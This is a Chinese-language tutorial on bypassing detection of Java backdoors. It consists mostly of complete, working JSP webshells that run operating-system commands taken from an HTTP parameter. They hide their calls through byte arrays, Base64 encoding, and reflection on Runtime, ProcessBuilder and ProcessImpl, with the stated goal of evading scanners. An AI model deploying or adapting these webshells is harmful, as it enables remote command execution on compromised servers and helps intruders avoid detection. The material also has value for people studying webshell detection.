

# JAVA后门检测绕过

#### 基础：

##### java执行系统命令的主要类：

`java.lang.Runtime`

`java.lang.ProcessBuilder`

![Runtime系统调用](E:\JAVA\Runtime系统调用.png)

##### 最简单的执行系统命令后门：

```java
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```

##### jsp标签

```java
<%@ %>    页面指令，设定页面属性和特征信息
<% %>     java代码片段，不能在此声明方法
<%! %>    java代码声明，声明全局变量或当前页面的方法
<%= %>    Java表达式
```



#### 使用ProcessBuilder绕过检测

```java
<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>
<FORM METHOD="POST" NAME="form" ACTION="#">
    <INPUT TYPE="text" NAME="q">
    <INPUT TYPE="submit" VALUE="Fly">
</FORM>

<%
    String op="Got Nothing";
    String query = request.getParameter("q");
	//表明文件路径区分符，比如在中英文下就是"/"
	//valueOf() 方法用于返回给定参数的原生 Number 对象值
	//用fileSeparator来判断操作系统类型 一般使用System.getProperty/getProperties获取操作系统的类型，这里使用路径分隔符简单判断
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }

    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            //将"cmd"、"/c"和"/bin/bash"、"-c"等都做了处理，由字节转为字符串
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        //使用Scanner接收回显 接收命令回显数据时，避免使用BufferedReader等常见手段
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<PRE>
    <%= op %>>
</PRE>
</BODY>
</HTML>
```

![fromcharcode](E:\JAVA\fromcharcode.png)



#### 使用Java反射机制绕过机制检测

##### 反射Runtime

```java
String op = "";
//获取Runtime类的Class对象
Class rt = Class.forName("java.lang.Runtime");
//分别获取Runtime类Class对象中的getRuntime方法和exec方法
Method gr = rt.getMethod("getRuntime");
Method ex = rt.getMethod("exec", String.class);
//利用Method getRuntime进行invoke调用，执行cmd /c
Process e = (Process) ex.invoke(gr.invoke(null, new Object[]{}),  "cmd /c ping www.baidu.com");
Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
op = sc.hasNext() ? sc.next() : op;
sc.close();
System.out.print(op);
```

```java
<%@ page import="java.util.Scanner" pageEncoding="UTF-8" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>

<FORM METHOD=POST ACTION='#'>
    <INPUT name='q' type=text>
    <INPUT type=submit value='Fly'>
</FORM>

<%!
    public static String getPicture(String str) throws Exception{
        String fileSeparator = String.valueOf(java.io.File.separatorChar);
        if(fileSeparator.equals("\\")){
        // cmd.exe /C
            str = new String(new byte[] {99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32}) + str;
        }else{
        // /bin/bash -c
            str =  new String(new byte[] {47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32}) + str;
        }
        //上一个是利用ProcessBuilder，这一个是利用Runtime的反射机制
        //java.lang.Runtime
        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
        //exec
        //getRuntime
        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null, new Object[]{}),  new Object[] { str });
        Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
        String result = "";
        result = sc.hasNext() ? sc.next() : result;
        sc.close();
        return result;
    }
%>

<%
    String name ="Input Nothing";
    String query = request.getParameter("q");
    if(query != null) {
        name = getPicture(query);
    }
%>

<pre>
<%= name %>
</pre>

</BODY>
</HTML>
```

![反射机制_Runtime](E:\JAVA\反射机制_Runtime.png)



<%! %>标签里声明了用来执行系统命令的getPicture方法，<% %>标签里接受输入的命令，调用了getPicture方法，执行命令并返回结果，<%= %>标签里输出系统命令执行结果到网页的`<pre>`标签对中 



##### 反射ProcessBuilder

```java
<%@ page pageEncoding="UTF-8" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>

<FORM METHOD=POST ACTION='#'>
    <INPUT name='q' type=text>
    <INPUT type=submit value='Fly'>
</FORM>

<%!
    public static String getPicture(String str) throws Exception {
        List<String> list = new ArrayList<>();
        BASE64Decoder decoder = new BASE64Decoder();
        BASE64Encoder encoder = new BASE64Encoder();
        String fileSeparator = String.valueOf(java.io.File.separatorChar);
        if(fileSeparator.equals("\\")){
            list.add(new String(decoder.decodeBuffer("Y21k")));
            list.add(new String(decoder.decodeBuffer("L2M=")));
        }else{
            list.add(new String(decoder.decodeBuffer("L2Jpbi9iYXNo")));
            list.add(new String(decoder.decodeBuffer("LWM=")));
        }
        list.add(new String(decoder.decodeBuffer(str)));
        Class PB = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy")));
        Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer("c3RhcnQ="))).invoke(PB.getDeclaredConstructors()[0].newInstance(list));
        Scanner sc = new Scanner(s.getInputStream()).useDelimiter("\\A");
        String result = "";
        result = sc.hasNext() ? sc.next() : result;
        sc.close();
        return encoder.encode(result.getBytes("UTF-8"));
    }

%>

<%
    String name ="Input Nothing";
    String query = request.getParameter("q");
    if(query != null) {
        name = getPicture(query);
    }
%>

<pre>
<%= name %>
</pre>

</BODY>
</HTML>
```



##### 反射ProcessImpl

ProcessImpl类不是public修饰的，不能从java.lang包外的地方直接访问。所以想要接触到ProcessImpl.start方法就要用到反射机制(需要setAccessible true)，反射最原始的ProcessImpl类的start方法，来执行系统命令 

```java
static java.lang.Process java.lang.ProcessImpl.start(java.lang.String[],java.util.Map,java.lang.String,java.lang.ProcessBuilder$Redirect[],boolean) throws java.io.IOException
```

```java
import java.util.Map;
import java.lang.Process;
import java.util.Scanner;
import java.lang.reflect.Method;
import java.lang.ProcessBuilder.Redirect;


public class invoke_ProcessImpl {
    public static void main(String[] args) throws Exception{
        String op = "";

        String dir = ".";
        String[] cmdarray = new String[]{"ping", "127.0.0.1"};
        Map<String, String> environment = null;
        Redirect[] redirects = null;
        boolean redirectErrorStream = true;

        Class c = Class.forName("java.lang.ProcessImpl");
        Method m = c.getDeclaredMethod("start", String[].class, Map.class, String.class, Redirect[].class, boolean.class);
        m.setAccessible(true);
        Process e = (Process) m.invoke(null, cmdarray, environment, dir, redirects, redirectErrorStream);
        Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
        System.out.print(op);
    }
}
```

